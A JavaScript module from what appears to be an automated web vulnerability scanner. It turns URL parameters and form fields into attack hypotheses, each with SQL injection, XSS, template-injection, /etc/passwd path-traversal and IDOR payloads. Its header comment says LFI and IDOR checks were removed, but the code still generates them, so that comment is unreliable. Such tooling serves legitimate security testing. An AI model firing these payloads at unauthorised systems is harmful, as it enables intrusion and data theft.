/**
 * hypothesisEngine.js — Strategic Hypothesis Generation
 *
 * FIX: Restricted to XSS, SQLi, SSTI only.
 * SSTI hypotheses added for any endpoint with template-like param names.
 * Removed: SSRF, LFI, auth_bypass, IDOR — out of scope for focused scan.
 */

export function generateHypotheses(reconData) {
    const hypotheses = [];
    const { endpoints = [], forms = [], apiEndpoints = [], secrets = [] } = reconData;

    const PATTERNS = {
        SQLI: /\b(id|uid|user|name|search|query|filter|sort|order|cat|category|product|item|page|start|limit|offset|ref|from|to|date|type|role|group)\b/i,
        XSS: /\b(search|q|query|name|msg|comment|text|input|value|title|desc|content|keyword|term|s|message|feedback|note|output|display|show|render)\b/i,
        SSTI: /\b(template|tpl|view|render|theme|layout|format|lang|locale|page|content|body|text|output|name|title)\b/i,
        LFI: /\b(file|path|folder|dir|doc|document|page|template|view|load|read|include|require)\b/i,
        IDOR: /\b(id|user_id|account_id|profile_id|order_id|invoice_id|doc_id|uuid|uid)\b/i,
    };

    // 1. Parameterized endpoints
    for (const ep of endpoints) {
        const urlString = typeof ep === 'string' ? ep : ep.url;
        if (!urlString) continue;

        try {
            const url = new URL(urlString.startsWith('http') ? urlString : `https://x.com${urlString}`);
            for (const [param] of url.searchParams) {
                const endpoint = url.origin + url.pathname;

                if (PATTERNS.SQLI.test(param)) {
                    hypotheses.push({
                        type: 'sqli',
                        endpoint,
                        paramName: param,
                        injectIn: 'query',
                        confidence: 'high',
                        reason: `Param "${param}" is common SQLi vector`,
                        fullUrl: urlString,
                        payloads: ["' OR 1=1--", "' AND SLEEP(5)--", "' UNION SELECT NULL--"],
                    });
                }

                if (PATTERNS.XSS.test(param)) {
                    hypotheses.push({
                        type: 'xss',
                        endpoint,
                        paramName: param,
                        injectIn: 'query',
                        confidence: 'high',
                        reason: `Param "${param}" likely reflected (XSS)`,
                        fullUrl: urlString,
                        payloads: ['<script>alert(1)</script>', '"><img src=x onerror=alert(1)>', "'><svg onload=alert(1)>"],
                    });
                }

                if (PATTERNS.SSTI.test(param)) {
                    hypotheses.push({
                        type: 'ssti',
                        endpoint,
                        paramName: param,
                        injectIn: 'query',
                        confidence: 'medium',
                        reason: `Param "${param}" may be rendered in a template engine (SSTI)`,
                        fullUrl: urlString,
                        payloads: ['{{7*7}}', '${7*7}', '#{7*7}'],
                    });
                }

                if (PATTERNS.LFI.test(param)) {
                    hypotheses.push({
                        type: 'lfi',
                        endpoint,
                        paramName: param,
                        injectIn: 'query',
                        confidence: 'high',
                        reason: `Param "${param}" may be used in file inclusion or path traversal (LFI)`,
                        fullUrl: urlString,
                        payloads: ['../../../etc/passwd', '/etc/passwd', '....//....//etc/passwd'],
                    });
                }

                if (PATTERNS.IDOR.test(param)) {
                    hypotheses.push({
                        type: 'idor',
                        endpoint,
                        paramName: param,
                        injectIn: 'query',
                        confidence: 'medium',
                        reason: `Param "${param}" is an object identifier candidate for IDOR`,
                        fullUrl: urlString,
                        payloads: ['1', '2', '0', '-1', '9999'],
                    });
                }
            }
        } catch { /* skip */ }
    }

    // 2. Form inputs
    for (const form of forms) {
        const endpoint = form.action || form.url;
        if (!endpoint) continue;

        for (const input of (form.inputs || [])) {
            const name = typeof input === 'string' ? input : input.name;
            const inputType = typeof input === 'string' ? 'text' : (input.type || 'text');
            if (!name || ['submit', 'button', 'reset', 'file', 'hidden'].includes(inputType)) continue;

            const injectIn = (form.method || 'GET').toUpperCase() === 'POST' ? 'body' : 'query';

            if (PATTERNS.SQLI.test(name)) {
                hypotheses.push({
                    type: 'sqli',
                    endpoint,
                    paramName: name,
                    injectIn,
                    confidence: 'high',
                    reason: `Form input "${name}" (${form.method}) — SQLi candidate`,
                    payloads: ["' OR 1=1--", "' AND SLEEP(5)--"],
                });
            }

            // All text inputs are XSS candidates
            if (inputType === 'text' || inputType === 'textarea' || inputType === 'search') {
                hypotheses.push({
                    type: 'xss',
                    endpoint,
                    paramName: name,
                    injectIn,
                    confidence: inputType === 'textarea' ? 'high' : 'medium',
                    reason: `User-controlled input "${name}" in form`,
                    payloads: ['<script>alert(1)</script>', '"><img src=x onerror=alert(1)>'],
                });
            }

            if (PATTERNS.SSTI.test(name)) {
                hypotheses.push({
                    type: 'ssti',
                    endpoint,
                    paramName: name,
                    injectIn,
                    confidence: 'medium',
                    reason: `Form input "${name}" may feed a template engine`,
                    payloads: ['{{7*7}}', '${7*7}'],
                });
            }

            if (PATTERNS.LFI.test(name)) {
                hypotheses.push({
                    type: 'lfi',
                    endpoint,
                    paramName: name,
                    injectIn,
                    confidence: 'high',
                    reason: `Form input "${name}" may be vulnerable to LFI`,
                    payloads: ['../../../etc/passwd', '/etc/passwd'],
                });
            }

            if (PATTERNS.IDOR.test(name)) {
                hypotheses.push({
                    type: 'idor',
                    endpoint,
                    paramName: name,
                    injectIn,
                    confidence: 'medium',
                    reason: `Form input "${name}" is an IDOR candidate`,
                    payloads: ['1', '2', '0', '-1'],
                });
            }
        }
    }

    // 3. De-duplicate and sort
    const seenKeys = new Set();
    const unique = hypotheses.filter(h => {
        const key = `${h.type}::${h.endpoint}::${h.paramName}`;
        if (seenKeys.has(key)) return false;
        seenKeys.add(key);
        return true;
    });

    const order = { high: 0, medium: 1, low: 2 };
    return unique.sort((a, b) => (order[a.confidence] || 2) - (order[b.confidence] || 2));
}
